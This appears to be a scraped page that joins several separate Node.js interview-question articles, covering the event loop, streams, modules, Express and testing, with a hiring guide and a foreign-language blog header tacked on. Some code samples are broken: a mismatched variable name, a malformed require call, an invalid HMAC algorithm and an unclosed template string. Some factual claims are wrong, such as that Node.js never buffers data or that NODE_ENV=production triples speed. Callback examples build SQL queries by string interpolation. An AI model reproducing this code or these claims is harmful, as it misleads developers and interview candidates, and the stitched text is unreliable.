Top Node.js Interview Questions You Must Prepare In 2025
Last updated on Dec 09,2024346.1K Views
Share
image not found!
image not found!
image not found!
image not found!
image not found!
image not found!

Swatee ChandSwatee Chand 
Sr Research Analyst at Edureka. A techno freak who likes to explore different technologies. Likes to follow the technology trends in market and write...
1 / 1 Blog from Interview Questions 
myMock-desk-banner-bg
Node.js, the server-side scripting tool, using which one can build everything, starting from a simple command line programs to the complex enterprise level web applications with equal ease. This is why most industries demand a Certified Node.js Developer to manage the entire server side. Node.js, also brings with it, career opportunities at various levels. In case you are planning to attend Node.js interviews in the near future, we are here to help you with a list of Top 50 Node.js interview questions that you must prepare in 2025.

In this Node.js interview questions article, I have divided the questions into 3 segments based on their difficulty level:

Node.js Interview Questions – Beginners Level
Node.js Interview Questions – Moderate Level
Node.js Interview Questions – Advanced Level
Before I start off with this Node.js Interview Questions article, let me put forth a request to the readers who might have attended Node.js interviews in recent past. So, if you have come across such questions which were asked in interviews but are missing in this article, feel free to put those questions in the comment section below. We will try and answer those at the earliest so that others can also benefit from it.

Now, let’s get started.

Basic Node.js Interview Questions for Freshers
1. Differentiate between JavaScript and Node.js.
JavaScript vs Node.js
Features	JavaScript	Node.js
Type	Programming Language	Interpreter and environment for JavaScript 
Utility	Used for any client-side activity for a web application	Used for accessing or performing any non-blocking operation of any operating system
Running Engine	Spider monkey (FireFox), JavaScript Core (Safari), V8 (Google Chrome), etc.	V8 (Google Chrome)
2. What Is Node.js?
Node.js is an extremely powerful framework developed on Chrome’s V8 JavaScript engine that compiles the JavaScript directly into the native machine code. It is a lightweight framework used for creating server-side web applications and extends JavaScript API to offer usual server-side functionalities. It is generally used for large-scale application development, especially for video streaming sites, single page application, and other web applications.

3. List down the major benefits of using Node.js?
Features	Description
Fast	Node.js is built on Google Chrome’s V8 JavaScript Engine which makes its library very fast in code execution
Asynchronous	Node.js based server never waits for an API to return data thus making it asynchronous
 Scalable	It is highly scalable because of its event mechanism which helps the server to respond in a non-blocking way
Open Source	Node.js has an extensive open source community which has contributed in producing some excellent modules to add additional capabilities to Node.js applications
No Buffering	Node.js applications simply output the data in chunks and never buffer any data
4. What is the difference between Angular and Node.js?
Angular	Node.js
1. It is an open source web application development framework	1. It is a cross-platform run-time environment for applications
2. It is written in TypeScript	2. It is written in C, C++ and JavaScript languages
3. Used for building single-page client-side web applications	3. Used for building fast and scalable server-side networking applications
4. Angular itself is a web application framework	4. Node.js has many different frameworks like Sails.js, Partial.js, and Express.js, etc.
5. Ideal for creating highly active and interactive web apps	5. Ideal for developing small size projects
6. Helpful in splitting an app into MVC components	6. Helpful in generating database queries 
7. Suitable for developing real-time applications 	7. Suitable in situations where something faster and more scalable is required
5. Why Node.js is single threaded?
Node.js uses a single threaded model in order to support async processing. With async processing, an application can perform better and is more scalable under web loads. Thus, Node.js makes use of a single-threaded model approach rather than typical thread-based implementation.

6. How do Node.js works?
Node.js is a virtual machine that uses JavaScript as its scripting language and runs on a v8 environment. It works on a single-threaded event loop and a non-blocking I/O which provides high rate as it can handle a higher number of concurrent requests. Also, by making use of the ‘HTTP’ module, Node.js can run on any stand-alone web server. 

7. Where Node.js can be used?
Node.js can be used to develop:

Real-Time Web Applications
Network Applications
Distributed Systems
General Purpose Applications
8. How many types of API functions are there in Node.js?
There are two types of API functions in Node.js:

Asynchronous, non-blocking functions
Synchronous, blocking functions
9. What is the difference between Asynchronous and Non-blocking?
Asynchronous	Non-blocking
Asynchronous means not synchronous. Using these we can make asynchronous HTTP requests that do not wait for the server to respond. These functions continue to respond to the request for which it has already received the server response.	Non-blocking functions are used in regards with I/O operations. They immediately respond with whatever data is available and keeps on running as per the requests. In case, any answer couldn’t be retrieved then the API returns immediately with an error. 
In case you are facing any challenges with these Node.js Interview Questions, please mention your problems in the section comment section below.

10. What is package.json?
The package.json file in Node.js is the heart of the entire application. It is basically the manifest file that contains the metadata of the project where we define the properties of a package.


package-json-edureka11. What do you understand by Event-driven programming?
Event-driven programming is an approach that heavily makes use of events for triggering various functions. An event can be anything like a mouse click, key press, etc. When an event occurs, a call back function is executed that is already registered with the element. This approach mainly follows the publish-subscribe pattern. Because of event-driven programming, Node.js is faster when compared to other technologies.

Web Development Full Course for Beginners


12. What is an Event loop in Node.js and how does it work?
An event loop in Node.js handles all the asynchronous callbacks in an application. It is one of the most important aspects of Node.js and the reason behind Node.js have non-blocking I/O. Since Node.js is an event-driven language, you can easily attach a listener to an event and then when the event occurs the callback will be executed by the specific listener. Whenever functions like setTimeout, http.get, and fs.readFile are called, Node.js executed the event loop and then proceeds with the further code without waiting for the output. Once the entire operation is finished, Node.js receives the output and then executes the callback function. This is why all the callback functions are placed in a queue in a loop. Once the response is received, they are executed one by one.

Thread Model - Node.js Interview Questions - Edureka

13. Explain  REPL in the context of Node.js.
REPL in Node.js stands for Read, Eval, Print, and Loop. It represents a computer environment such as a window console or Unix/Linux shell where any command can be entered and then the system can respond with an output. Node.js comes bundled with a REPL environment by default. REPL can perform the below-listed tasks:

Read: Reads the user’s input, parses it into JavaScript data-structure and then stores it in the memory.
Eval: Receives and evaluates the data structure.
Print: Prints the final result.
Loop: Loops the provided command until CTRL+C is pressed twice.
14. List down the tasks which should be done asynchronously using the event loop?
Below is the list of the tasks which must be done asynchronously using the event loop:

 I/O operations
Heavy computation
Anything requiring blocking
15. List down the steps using which “Control Flow” controls the function calls in Node.js?
Control the order of execution
Collect data
Limit concurrency
Call the next step in the program
Want to upskill yourself to get ahead in your career? Check out this video
 

Top 10 Technologies to Learn in 2025 | Edureka

This Edureka video on will introduce you to all the popular and trending technologies in the market which you should focus on in 2025. These are the trending technologies that you need to learn in order to have a successful career in the year 2025.


 

Intermediate Node.js Interview Questions – Moderate Level
16. What do you understand by a test pyramid?
A test pyramid basically is a diagram that describes the ratio of how many unit tests, integration tests, and end-to-end test are required to be written for the successful development of the project.test pyramid - NodeJS Interview Questions - Edureka

17. What is an error-first callback in Node.js?
Error-first callbacks in Node.js are used to pass errors and data. The very first parameter you need to pass to these functions has to be an error object while the other parameters represent the associated data. Thus you can pass the error object for checking if anything is wrong and handle it. In case there is no issue, you can just go ahead and with the subsequent arguments.

var myPost = new Post({title: 'edureka'});
myPost.save(function(err,myInstance){
if(err){
//handle error and return
}
//go ahead with `myInstance`
});
18. Explain the purpose of module.exports?
A module in Node.js is used to encapsulate all the related codes into a single unit of code which can be interpreted by shifting all related functions into a single file. For example, suppose you have a file called greet.js that contains the two functions as shown below:

module.exports = {
greetInHindi: function(){
return "NAMASTE";
},
greetInKorean: function(){
return "ANNYEONGHASEYO";
}};
As you can see module.exports provide two functions which can be imported in another file using below code:

var eduGreets = require ("./greet.js");
eduGreets.greetInHindi() //NAMASTE
eduGreets.greetInKorean() //ANNYEONGHASEYO
19. What do you understand by Reactor Pattern in Node.js?
Reactor Pattern in Node.js is basically a concept of non-blocking I/O operations. This pattern provides a handler that is associated with each I/O operation and as soon as an I/O request is generated, it is then submitted to a demultiplexer. This demultiplexer is a notification interface which is capable of handling concurrency in non-blocking I/O mode. It also helps in collecting each and every request in the form of an event and then place each event in a queue. Thus resulting in the generation of the Event Queue. Simultaneously, we have our event loop which iterates the events present in the Event Queue.

20. What’s the difference between ‘front-end’ and ‘back-end’ development?
Front-end Development	Back-end Development
1. Uses mark up and web languages like HTML, CSS, JavaScript	1. Uses programming and scripting languages like Python, Ruby, Perl, etc.
2. Based on asynchronous requests and AJAX	2. Based on Server Architecture
3. Better Accessibility	3. Enhanced Security
4. Used for SEO	4. Used for Backup
21. What are LTS releases of Node.js?
LTS stands Long Term Support version of Node.js that receives all the critical bug fixes along with security updates and performance improvements. These versions are supported for at least 18 months and mainly focus on stability and security. The modifications done to the LTS versions are restricted to the bug fixes, security upgrade, npm, and documentation updates, performance improvement, etc.

22. List down the major security implementations within Node.js?
Major security implementations in Node.js are:

Authentications
Error Handling
23. What do you understand by callback hell?
Callback Hell is also known as the Pyramid of Doom. It is a pattern caused by intensively nested callbacks which are unreadable and unwieldy. It typically contains multiple nested callback functions which in turn make the code hard to read and debug. It is caused by improper implementation of the asynchronous logic.

async_A(function(){
async_B(function(){
async_C(function(){
async_D(function(){
....
});
});
});
});
In case you are facing any challenges with these Node.js Interview Questions, please mention your problems in the section comment section below.

24. Explain libuv.
Libuv is a multi-platform support library of Node.js which majorly is used for asynchronous I/O. It was primarily developed for Node.js,  with time it is popularly practiced with other systems like as Luvit, pyuv, Julia, etc. Libuv is basically an abstraction around libev/ IOCP depending on the platform, providing users an API based on libev. A few of the important features of libuv are:

Full-featured event loop backed
File system events
Asynchronous file & file system operations
Asynchronous TCP & UDP sockets
Child processes
25. Explain the concept of middleware in Node.js?
In general, middleware is a function receives the Request and Response objects. In other words, in an application’s request-response cycle these functions have access to various request &  response objects along with the next function of the cycle. The next function of middleware is represented with the help of a variable, usually named next. Most commonly performed tasks by the middleware functions are:

Execute any type of code
Update or modify the request and the response objects
Finish the request-response cycle
Invoke the next middleware in the stack
26. Explain the concept of URL module.
The URL module of Node.js provides various utilities for URL resolution and parsing. It is a built-in module that helps in splitting up the web address into a readable format:

var url = require('url');
For example:

var url = require('url');
var adrs = 'http://localhost:8082/default.htm?year=2019&amp;amp;month=april';
var q = url.parse(adr, true);
console.log(q.host); //returns 'localhost:8082'
console.log(q.pathname); //returns '/default.htm'
console.log(q.search); //returns '?year=2019 and month=april'
var qdata = q.query; //returns an object: { year: 2019, month: 'april' }
console.log(qdata.month); //returns 'april'
27. What do you understand by ESLint?
ESLint is an open source project initially developed by Nicholas C. Zakas in 2013 which aims to provide a linting utility for JavaScript through a plug. Linters in Node.js are good tools for searching certain bug classes, especially those which are related to the variable scope. 

28. For Node.js, why Google uses V8 engine?
Google uses V8 as it is a Chrome runtime engine that converts JavaScript code into native machine code. This, in turn, speeds up the application execution and response process and give you a fast running application.

29. Explain the working of the control flow function.
In Node.js, the control flow function is basically the code that is executed between the asynchronous function calls. Below are the steps that must be followed for executing it:

Firstly, the order of execution must be controlled. 
Then, the required data need to be collected.
Next, the concurrency must be limited.
Once done, the next step of the program has to be invoked.
30. List down the two arguments that async.queue takes as input?
Below are the two arguments that async.queue takes as input:

Task Function
Concurrency Value
31. Differentiate between spawn() and fork() methods in Node.js?
In Node.js, the spawn() is used to launch a new process with the provided set of commands. This method doesn’t create a new V8 instance and just one copy of the node module is active on the processor. When your child process returns a large amount of data to the Node you can invoke this method.

Syntax:

child_process.spawn(command[, args][, options])
Whereas, the fork() in Node.js is a special instance of spawn() that executes a new instance of the V8 engine. This method simply means that multiple workers are running on a single Node code base for various task.

Syntax:

child_process.fork(modulePath[, args][, options])
In case you are facing any challenges with these Node.js Interview Questions, please mention your problems in the section comment section below.

32. What do you understand by global objects in Node.js?
In Node.js, Globals are the objects which are global in nature and are available in all the modules of the application. You can use these objects directly in your application, rather than having to include them explicitly. The global objects can be modules, functions, strings, object, etc. Moreover, some of these objects can be in the module scope instead of global scope.

33. Explain the concept of stub in Node.js.
In Node.js, stubs are basically the programs or functions that are used for stimulating the module or component behavior. During any test cases, stubs provide the canned answers of the functions.

34. How assert works in Node.js?
In Node.js, assert is used to write tests. It only provides feedback only when any of the running test cases fails. This module gives you a set of assertion tests which are then used for testing invariants. It is basically used internally by Node.js but using require(‘assert’) code, it can be used in other applications as well.

var assert = require('assert');
function mul(a, b) {
return a * b;
}
var result = mul(1,2);
assert( result === 2, 'one multiplied by two is two');
35. Define the concept of the test pyramid. Explain the process to implement them in terms of HTTP APIs.
The test pyramid is basically a concept that is developed by Mike Cohn. According to this, you should have a higher number of low-level unit tests as compared to high-level end-to-end tests that running through a GUI.

In terms of HTTP APIs it may be defined as:

A higher number of low-level unit tests for each model
Lesser integration tests to test model interactions
Lesser acceptance tests for testing actual HTTP endpoints
36. Explain the purpose of ExpressJS package?
Express.js is a framework built on top of Node.js that facilitates the management of the flow of data between server and routes in the server-side applications.  It is a lightweight and flexible framework that provides a wide range of features required for the web as well as mobile application development. Express.js is developed on the middleware module of Node.js called connect. The connect module further makes use of http module to communicate with Node.js. Thus, if you are working with any of the connect based middleware modules, then you can easily integrate with Express.js.

37. Differentiate between process.nextTick() and setImmediate()?
In Node.js, process.nextTick() and setImmediate(), both are functions of the Timers module which help in executing the code after a predefined period of time. But these functions differ in their execution. The process.nextTick function waits for the execution of action till the next pass around in the event loop or once the event loop is completed only then it will invoke the callback function. On the other hand, setImmediate() is used to execute a callback method on the next cycle of the event loop which eventually returns it to the event loop in order to execute the I/O operations.

38. Explain the usage of a buffer class in Node.js?
Buffer class in Node.js is used for storing the raw data in a similar manner of an array of integers. But it corresponds to a raw memory allocation that is located outside the V8 heap. It is a global class that is easily accessible can be accessed in an application without importing a buffer module. Buffer class is used because pure JavaScript is not compatible with binary data. So, when dealing with TCP streams or the file system, it’s necessary to handle octet streams.

39. How does Node.js handle the child threads?
In general, Node.js is a single threaded process and doesn’t expose the child threads or thread management methods. But you can still make use of the child threads using spawn() for some specific asynchronous I/O tasks which execute in the background and don’t usually execute any JS code or hinder with the main event loop in the application. If you still want to use the threading concept in your application you have to include a module called ChildProcess explicitly.

40. Explain stream in Node.js along with its various types.
Streams in Node.js are the collection of data similar to arrays and strings. They are objects using which you can read data from a source or write data to a destination in a continuous manner. It might not be available at once and need not to have fit in the memory. These streams are especially useful for reading and processing a large set of data. In Node.js, there are four fundamental types of streams:

Readable: Used for reading large chunks of data from the source.
Writeable: Use for writing large chunks of data to the destination.
Duplex: Used for both the functions; read and write.
Transform: It is a duplex stream that is used for modifying the data.
Advanced Node.js Interview Questions for Experienced Professional
41. What is the use of NODE_ENV?
If the project is in the production stage, Node.js promotes the convention of making use of NODE_ENV variable to flag it. This helps in taking better judgment during the development of the projects. Also, when you set your NODE_ENV to production, your application tends to perform 3 times faster.

42. Differentiate between readFile vs createReadStream in Node.js?
Node.js provides two ways to read and execute files which are using readFile and CreateStream. readFile() is a fully buffered process which returns the response only when the complete file is pushed into the buffer and is read. It is a memory intensive process and in case of large files, the processing can be very slow. Whereas createReadStream is a partially buffered which treats the entire process as an event series. The entire file is split into chunks which are then processed and sent back as a response one by one. Once done, they are finally removed from the buffer. Unlike readFile, createReadStream is really effective for the processing of the large files.

43. List down the various timing features of Node.js.
Node.js provides a Timers module which contains various functions for executing the code after a specified period of time. Below I have listed down the various functions provided by this module:

setTimeout/clearTimeout – Used to schedule code execution after a designated amount of milliseconds
setInterval/clearInterval – Used to execute a block of code multiple times
setImmediate/clearImmediate – Used to execute code at the end of the current event loop cycle
process.nextTick – Used to schedule a callback function that needs to be invoked in the next iteration of the Event Loop
44. Explain the concept of Punycode in Node.js?
In Node.js, Punycode is an encoding syntax that is used for converting Unicode (UTF-8) string of characters into a basic ASCII string of characters. It is important as the hostnames can only understand the ASCII characters. Thus, Node.js version 0.6.2 onwards, it was bundled up with the default Node package. If you want to use it with any previous versions, you can easily do that by using the following code:

Syntax:
punycode = require('punycode');
45. Differentiate between Node.js vs Ajax?
The most basic difference between Node.js and Ajax that, Node.js is a server-side JavaScript whereas Ajax is a client-side technology. In simpler terms, Ajax is mostly used for updating or modifying the webpage contents without having to refresh it. On the other hand, Node.js is required to develop the server software that are typically executed by the servers instead of the web browsers.

46. Does Node.js provide any Debugger?
Node.js do provide a simple TCP based protocol and debugging client that comes built-in. In order to debug your JavaScript file, you can use the below debug argument followed by js file name that you want to debug.

Syntax:

node debug [script.js | -e "script" | &amp;lt;host&amp;gt; : &amp;lt;port&amp;gt; ]
In case you are facing any challenges with these Node.js Interview Questions, please mention your problems in the section comment section below.

47. Describe the exit codes of Node.js.
In Node.js, exit codes are a set of specific codes which are used for finishing a specific process. These processes can include the global object as well. Below are some of the exit codes used in Node.js:

Uncaught fatal exception
Unused
Fatal Error
Internal Exception handler Run-time failure
Internal JavaScript Evaluation Failure
48. What do you understand by an Event Emitter in Node.js?
EventEmitter is a Node.js class that includes all the objects that are capable of emitting events. These objects contain an eventEmitter.on() function through which more than one function can be attached to the named events that are emitted by the object. Whenever an EventEmitter object throws an event, all the attached functions to that specific event are invoked synchronously. Below code shows how to us the EventEmitter in your application:

const EventEmitter = require('events');
class MyEmitter extends EventEmitter { }
const myEmitter = new MyEmitter();
myEmitter.on('event', () =&amp;gt; {
console.log('an event occurred!');
});
myEmitter.emit('event');
49. Is cryptography supported in Node.js?
Yes, Node.js does support cryptography through a module called Crypto. This module provides various cryptographic functionalities like cipher, decipher, sign and verify functions, a set of wrappers for open SSL’s hash HMAC etc. For example:

Syntax:

const crypto = require'crypto');
const secret = 'akerude';
const hash = crypto.createHmac('swaEdu', secret).update('Welcome to Edureka').digest('hex');
console.log(hash);
50. Explain the reason as to why Express ‘app’ and ‘server’ must be kept separate.
Express ‘app’ and ‘server’ must be kept separate as by doing this, you will be separating the API declaration from the network related configuration which benefits in the below listed ways:

It allows testing the API in-process without having to perform the network calls
Faster testing execution
Getting wider coverage metrics of the code
Allows deploying the same API under flexible and different network conditions
Better separation of concerns and cleaner code
API declaration should reside in app.js:

var app = express();
app.use(bodyParser.json());
app.use("/api/events", events.API);
app.use("/api/forms", forms);
Server network declaration should reside in /bin/www:

var app = require('../app');
var http = require('http');
//Get port from environment and store in Express
var port = normalizePort(process.env.PORT || '8000');
app.set('port', port);
//Create HTTP server.
var server = http.createServer(app);
With this, we come to an end of this Node.js Interview Questions article. I hope you found it informative and it helped in adding up to your knowledge. If you want to cover the fundamentals of Node.js in more depth, you can refer to my Node.js Tutorial article.

If you found this “Node.js Interview Questions” relevant, check out the Node.js Certification Training by Edureka, a trusted online learning company with a network of more than 250,000 satisfied learners spread across the globe. 

Got a question for us? Please mention it in the comments section of this Node.js Interview Questions and we will get back to you.

1.
How does Node.js handle child threads?

Hide answer
Node.js, in its essence, is a single thread process. It does not expose child threads and thread management methods to the developer. Technically, Node.js does spawn child threads for certain tasks such as asynchronous I/O, but these run behind the scenes and do not execute any application JavaScript code, nor block the main event loop.

If threading support is desired in a Node.js application, there are tools available to enable it, such as the ChildProcess module. In fact, Node.js 12 has experimental support for threads.

2.
How does Node.js support multi-processor platforms, and does it fully utilize all processor resources?

Hide answer
Since Node.js is by default a single thread application, it will run on a single processor core and will not take full advantage of multiple core resources. However, Node.js provides support for deployment on multiple-core systems, to take greater advantage of the hardware. The Cluster module is one of the core Node.js modules and it allows running multiple Node.js worker processes that will share the same port.

3.
What is typically the first argument passed to a Node.js callback handler?

Hide answer
Node.js core modules, as well as most of the community-published ones, follow a pattern whereby the first argument to any callback handler is an optional error object. If there is no error, the argument will be null or undefined.

A typical callback handler could therefore perform error handling as follows:

function callback(err, results) {
    // usually we'll check for the error before handling results
    if(err) {
        // handle error somehow and return
    }
    // no error, perform standard callback handling
}
4.
What is REPL? What purpose it is used for?

Hide answer
REPL stands for (READ, EVAL, PRINT, LOOP). Node js comes with bundled REPL environment. This allows for the easy creation of CLI (Command Line Interface) applications.

5.
Consider the following JavaScript code:

console.log("first");
setTimeout(() => {
    console.log("second");
}, 0);
console.log("third");
The output will be:

first
third
second
Assuming that this is the desired behavior, how else might we write this code?

Hide answer
Way back when, Node.js version 0.10 introduced setImmediate, which is equivalent to setTimeout(fn, 0), but with some slight advantages.

setTimeout(fn, delay) calls the given callback fn after the given delay has ellapsed (in milliseconds). However, the callback is not executed immediately at this time, but added to the function queue so that it is executed as soon as possible, after all the currently executing and currently queued event handlers have completed. Setting the delay to 0 adds the callback to the queue immediately so that it is executed as soon as all currently-queued functions are finished.

setImmediate(fn) achieves the same effect, except that it doesn’t use the queue of functions. Instead, it checks the queue of I/O event handlers. If all I/O events in the current snapshot are processed, it executes the callback. It queues them immediately after the last I/O handler, somewhat like process.nextTick. This is faster than setTimeout(fn, 0).

So, the above code can be written in Node.js as:

console.log("first");
setImmediate(() => {
    console.log("second");
});
console.log("third");
6.
What is the preferred method of resolving unhandled exceptions in Node.js?

Hide answer
Unhandled exceptions in Node.js can be caught at the Process level by attaching a handler for uncaughtException event.

process.on('uncaughtException', (err) => {
  console.log(`Caught exception: ${err}`);
});
However, uncaughtException is a very crude mechanism for exception handling and may be removed from Node.js in the future. An exception that has bubbled all the way up to the Process level means that your application, and Node.js may be in an undefined state, and the only sensible approach would be to restart everything.

The preferred way is to add another layer between your application and the Node.js process which is called the domain.

Domains provide a way to handle multiple different I/O operations as a single group. So, by having your application, or part of it, running in a separate domain, you can safely handle exceptions at the domain level, before they reach the Process level.

However, domains have been pending deprecation for a few years—since Node.js 4. It’s possible a more future-proof approach would be to use zones.

7.
Consider following code snippet:

{
    console.time("loop");
    for (var i = 0; i < 1000000; i += 1){
        // Do nothing
    }
    console.timeEnd("loop");
}
The time required to run this code in Google Chrome is considerably more than the time required to run it in Node.js. Explain why this is so, even though both use the v8 JavaScript Engine.

Hide answer
Within a web browser such as Chrome, declaring the variable i outside of any function’s scope makes it global and therefore binds it as a property of the window object. As a result, running this code in a web browser requires repeatedly resolving the property i within the heavily populated window namespace in each iteration of the for loop.

In Node.js, however, declaring any variable outside of any function’s scope binds it only to the module’s own scope (not the window object) which therefore makes it much easier and faster to resolve.

It’s also worth noting that using let instead of var in the for loop declaration can reduce the loop’s run time by over 50%. But such a change assumes you know the difference between let and var and whether this will have an effect on the behavior of your specific loop.

8.
What is “callback hell” and how can it be avoided?

Hide answer
“Callback hell” refers to heavily nested callbacks that have become unweildy or unreadable.

An example of heavily nested code is below:

query("SELECT clientId FROM clients WHERE clientName='picanteverde';", function(id){
  query(`SELECT * FROM transactions WHERE clientId=${id}`, function(transactions){
    transactions.each((transac) => {
      query(`UPDATE transactions SET value = ${transac.value*0.1} WHERE id=${transac.id}`, (error) => {
        if(!error){
          console.log("success!!");
        }else{
          console.log("error");
        }
      });
    });
  });
});
At one point, the primary method to fix callback hell was modularization. The callbacks are broken out into independent functions which can be called with some parameters. So the first level of improvement might be:

const logError = (error) => {
    if(!error){
      console.log("success!!");
    }else{
      console.log("error");
    }
  },
  updateTransaction = (t) => {
    query(`UPDATE transactions SET value = ${t.value*0.1} WHERE id=${t.id}, logError);
  },
  handleTransactions = (transactions) => {
    transactions.each(updateTransaction);
  },
  handleClient = (id) => {
    query(`SELECT * FROM transactions WHERE clientId=${id}`, handleTransactions);
  };

query("SELECT clientId FROM clients WHERE clientName='picanteverde';",handleClient);
Even though this code is much easier to read, and we created some functions that we can even reuse later, in some cases it may be appropriate to use a more robust solution in the form of promises. Promises allow additional desirable behavior such as error propagation and chaining. Node.js includes native support for them.

Additionally, a more supercharged solution to callback hell was provided by generators, as these can resolve execution dependency between different callbacks. However, generators are much more advanced and it might be overkill to use them for this purpose. To read more about generators you can start with this post.

However, these approaches are pretty dated at this point. The current solution is to use async/await—an approach that leverages Promises and finally makes it easy to flatten the so-called “pyramid of doom” shown above.

#Technology
Latest Interview Questions for a Node JS Developer

edchartblog / 3 years
Nov 15, 2023
0
7 min read
twitter sharing button Postfacebook sharing button Sharewhatsapp sharing button Sharedigg sharing button Share
Latest Top interview questions and answers for a Node JS developer for experienced and freshers, get ready to crack any interview.

Node JS certification
Node JS certification -click here
Basics of Node.js interview question:
What is Node.js?
Answer: Node.js is a server-side JavaScript runtime built on the V8 JavaScript engine. It allows developers to run JavaScript code on the server, enabling the development of scalable and high-performance web applications.
Explain the event-driven architecture in Node.js.
Answer: Node.js is designed to be event-driven and non-blocking. It uses an event loop to handle events asynchronously, making it highly scalable for handling concurrent connections.
How do you handle asynchronous operations in Node.js?
Answer: Asynchronous operations in Node.js are handled using callbacks, Promises, or the async/await syntax. The event-driven architecture allows non-blocking I/O operations.
What is npm, and how is it used in Node.js?
Answer: npm (Node Package Manager) is the default package manager for Node.js. It is used to install, manage, and share JavaScript packages and libraries.
Explain the role of the require function in Node.js.
Answer: The require function is used to import modules in Node.js. It allows using code from other files by including the module’s exports.
What is the purpose of the fs module in Node.js?
Answer: The fs (File System) module in Node.js provides functions for interacting with the file system. It allows reading, writing, and manipulating files and directories.
How do you create a basic server in Node.js using the http module?
Answer: You can create a basic server using the http module by creating an instance of http.Server and listening for requests.
const http = require('http');
const server = http.createServer((req, res) => {
  res.end('Hello, World!');
});
server.listen(3000, () => console.log('Server running on port 3000'));
Explain the concept of middleware in Node.js.
Answer: Middleware in Node.js are functions that have access to the request, response, and the next middleware function. They can modify request or response objects, end the request-response cycle, or call the next middleware.
What is the purpose of the process object in Node.js?
Answer: The process object in Node.js provides information about the current Node.js process. It can be used to access command-line arguments, environment variables, and manage the process lifecycle.
What is the role of the Buffer class in Node.js?
Answer: The Buffer class in Node.js is used to handle binary data directly. It provides a way to work with raw binary data and is particularly useful for working with streams and file systems.
Node JS certification
Node JS certification -click here
Advanced Node.js Concepts interview question:
Explain the concept of streams in Node.js.
Answer: Streams in Node.js are objects that allow reading or writing data sequentially. They help in efficiently processing large amounts of data by dividing it into smaller chunks.
What is the purpose of the events module in Node.js?
Answer: The events module in Node.js provides an EventEmitter class that allows the creation and handling of custom events. It is a fundamental part of the event-driven architecture in Node.js.
How does clustering work in Node.js, and why is it useful?
Answer: Clustering in Node.js involves creating multiple instances (workers) of the application to handle concurrent connections. It is useful for utilizing multiple CPU cores and improving performance.
Explain the concept of the Node.js event loop.
Answer: The event loop in Node.js is a continuous process that waits for events and executes callback functions when events occur. It allows non-blocking execution of code and efficient handling of I/O operations.
What is the purpose of the cluster module in Node.js?
Answer: The cluster module in Node.js allows the creation of child processes (workers) to distribute the load across multiple CPU cores. It helps in achieving better performance and scalability.
How does error handling work in Node.js?
Answer: Error handling in Node.js is typically done using try-catch blocks for synchronous code and callback functions with the first parameter as an error object for asynchronous code. Promises and the async/await syntax also provide ways to handle errors.
Explain the role of the util module in Node.js.
Answer: The util module in Node.js provides utility functions that are useful for debugging and working with objects. It includes functions like util.promisify for converting callback-based functions to Promises.
What is the purpose of the child_process module in Node.js?
Answer: The child_process module in Node.js allows the creation of child processes to run external commands or scripts. It is useful for tasks that require parallel or separate processing.
How does garbage collection work in Node.js?
Answer: Node.js uses the V8 JavaScript engine, which employs automatic garbage collection. Objects that are no longer referenced are automatically identified and reclaimed by the garbage collector.
Explain the concept of the Node.js module system.
Answer: The Node.js module system allows the organization of code into separate files (modules). Modules can export functionalities using module.exports and import functionalities using require.
Node JS certification
Node JS certification -click here
Web Development with Node.js interview question:
How do you connect Node.js to a database like MongoDB?
Answer: You can connect Node.js to MongoDB using the official MongoDB Node.js driver or an Object Data Modeling (ODM) library like Mongoose.
const mongoose = require('mongoose');
mongoose.connect('mongodb://localhost:27017/database', { useNewUrlParser: true, useUnifiedTopology: true });
Explain the purpose of the Express.js framework.
Answer: Express.js is a web application framework for Node.js. It simplifies the process of building robust and scalable web applications by providing features like routing, middleware, and template engines.
How do you handle authentication in a Node.js application?
Answer: Authentication in Node.js can be implemented using libraries like Passport.js. It involves strategies for different authentication methods (e.g., local, OAuth), session management, and protecting routes.
What is WebSocket, and how is it implemented in Node.js?
Answer: WebSocket is a communication protocol that provides full-duplex communication channels over a single, long-lived connection. In Node.js, libraries like socket.io are commonly used to implement WebSocket functionality.
Explain the purpose of the cookie-parser middleware in Express.js.
Answer: The cookie-parser middleware in Express.js parses and handles cookies in HTTP requests. It facilitates working with cookies in a web application.
Node JS certification
Node JS certification -click here
Testing in Node.js interview question:
How can you perform unit testing in Node.js?
Answer: Unit testing in Node.js can be performed using testing frameworks like Mocha or Jest. Assertions can be done using libraries like Chai or built-in assert module.
What is the purpose of the supertest library in Node.js testing?
Answer: The supertest library is used for testing HTTP assertions in Node.js applications. It allows making requests to the application and asserting the response.
How do you mock dependencies in Node.js testing?
Answer: Dependencies in Node.js testing can be mocked using tools like sinon or by creating manual mocks. Mocks help isolate the code under test and control the behavior of dependencies.
What is end-to-end testing, and how is it performed in Node.js applications?
Answer: End-to-end testing involves testing an application’s complete workflow. In Node.js, tools like Puppeteer or Cypress can be used for end-to-end testing.
Explain the concept of code coverage in Node.js testing.
Answer: Code coverage measures the percentage of code that is executed during testing. Tools like Istanbul or Jest provide code coverage reports to identify untested code.

Node.js Developer Interview Questions
Top 5 Node.js developer interview questions with detailed tips for both hiring managers and candidates.
Profile photo of Toni Ross — Senior Editor of Betterteam.
By Toni Ross, Jan 28, 2025
Toni Ross is the Senior Editor of Betterteam. Her interests include developing resources that help build and grow value-oriented, connected teams, both personal and professional.
A Node.js developer working on a laptop.
Node.js developers write and maintain server-side web applications. They develop back-end components, oversee the exchange of data between servers and end-users, and collaborate with front-end developers to deploy their applications across web-based platforms.

When interviewing Node.js developers, look for candidates who exhibit JavaScript coding expertise and the ability to ensure optimized web application performance. Be wary of candidates who lack collaboration skills and those with limited experience in providing technical support.

Try Betterteam

Reach over 250 million candidates.

Get candidates in hours, not days.

Interview Questions for Node.js Developers:
1. Can you explain how you ensure optimal responsiveness to front-end requests?
Assesses the candidate's knowledge and experience in ensuring optimal network application performance.

2. Which methods do you recommend to document Node.js processes?
Highlights the candidate's experience in documenting Node.js processes and their ability to apply best practices in recordkeeping.

3. In your experience, what contributes to making a UI user-friendly?
Evaluates the candidate's knowledge and experience in designing user-friendly interfaces, as well as their ability to predict end-user needs.

4. Can you describe your most challenging network application deployment project?
Tests the candidate's knowledge and experience with network application development, as well as their problem-solving skills.

5. How do you keep abreast of new developments in Node.js?
Reveals the candidate's ability to keep their Node.js knowledge current in order to apply it in practice.

Собеседование по Node.js - вопросы и ответы
Запись от Reangularity размещена 20.05.2025 в 11:50
Показов 5721 Комментарии 0
Метки interview, javascript, libuv, node.js
Нажмите на изображение для увеличения
Название: 838d31ec-3c9f-49c9-bea5-6d188bf56849.jpg
Просмотров: 246
Размер:	149.9 Кб
